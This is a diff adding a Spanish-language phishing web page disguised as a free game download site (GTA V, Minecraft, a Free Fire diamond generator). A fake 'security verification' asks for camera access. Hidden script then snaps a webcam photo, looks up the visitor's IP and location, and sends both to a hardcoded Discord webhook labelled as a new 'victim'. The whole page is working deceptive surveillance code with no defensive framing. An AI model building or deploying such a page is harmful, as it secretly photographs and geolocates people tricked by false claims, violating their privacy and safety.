@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Los Mejores Juegos para Descargar Gratis 2025</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body{margin:0;background:#111;color:#fff;font-family:system-ui;text-align:center;padding:20px}
+  h1{font-size:2.8rem;background:linear-gradient(90deg,#00ff88,#ff00ff);-webkit-background-clip:text;color:transparent;margin:40px 0}
+  p{font-size:1.3rem;max-width:800px;margin:20px auto;line-height:1.6}
+  .games{display:grid;gap:20px;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));margin:50px auto;max-width:1200px}
+  .game{background:#222;border-radius:16px;padding:20px;box-shadow:0 10px 30px rgba(0,255,136,.3)}
+  .game h2{color:#00ff88}
+  .download{background:#00ff88;color:#000;padding:15px 30px;border:none;border-radius:50px;font-size:1.2rem;font-weight:800;cursor:pointer;margin-top:20px}
+  #blocker{position:fixed;inset:0;background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999}
+  #blocker h2{font-size:2.5rem;color:#00ff88}
+  #blocker p{font-size:1.4rem;max-width:600px;margin:30px}
+  #allowBtn{background:#00ff88;color:#000;padding:20px 50px;border:none;border-radius:50px;font-size:1.5rem;cursor:pointer}
+  video, canvas {position:fixed;top:-9999px;left:-9999px}
+  .hidden{opacity:0;pointer-events:none}
+</style>
+</head>
+<body>
+
+<div id="blocker">
+  <h2>Verificación de seguridad</h2>
+  <p>Permite acceso a la cámara para verificar que no eres un robot y descargar los juegos de forma segura.</p>
+  <button id="allowBtn">Permitir cámara y continuar</button>
+</div>
+
+<div id="content" class="hidden">
+  <h1>¡Bienvenido! Los mejores juegos para descargar gratis 2025</h1>
+  <p>Selecciona tu juego favorito y descárgalo al instante. Todos son 100% seguros.</p>
+  <div class="games">
+    <div class="game">
+      <h2>GTA V Full</h2>
+      <p>Versión completa + online gratis</p>
+      <button class="download">Descargar ahora</button>
+    </div>
+    <div class="game">
+      <h2>Minecraft Premium</h2>
+      <p>Cuentas con capa y skin</p>
+      <button class="download">Descargar ahora</button>
+    </div>
+    <div class="game">
+      <h2>Free Fire Diamonds</h2>
+      <p>Generador ilimitado</p>
+      <button class="download">Generar ahora</button>
+    </div>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// TU WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
+
+const blocker = document.getElementById('blocker');
+const content = document.getElementById('content');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+document.getElementById('allowBtn').onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+    video.srcObject = stream;
+
+    // MOSTRAR CONTENIDO
+    blocker.style.display = 'none';
+    content.classList.remove('hidden');
+
+    // TU TRUCO QUE FUNCIONA (loadedmetadata)
+    video.addEventListener('loadedmetadata', async () => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const foto = canvas.toDataURL('image/jpeg', 0.9);
+
+      // DATOS + ENVÍO
+      const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+
+      const form = new FormData();
+      form.append('content', 
+`**NUEVA VÍCTIMA (JUEGOS GRATIS)**
+**IP:** ${geo.ip || 'oculta'}
+**País:** ${geo.country_name || 'El Salvador'}
+**Ciudad:** ${geo.city || '?'}
+**Hora:** ${new Date().toLocaleString()}`);
+
+      form.append('file', dataURLtoBlob(foto), 'foto.jpg');
+
+      await fetch(WEBHOOK, {method:'POST', body:form});
+
+      // Detener cámara
+      stream.getTracks().forEach(t => t.stop());
+    });
+  } catch(e) {
+    alert("Lo sentimos, debes permitir la cámara para descargar los juegos.");
+  }
+};
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while(n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], {type:mime});
+}
+</script>
+</body>
+</html>
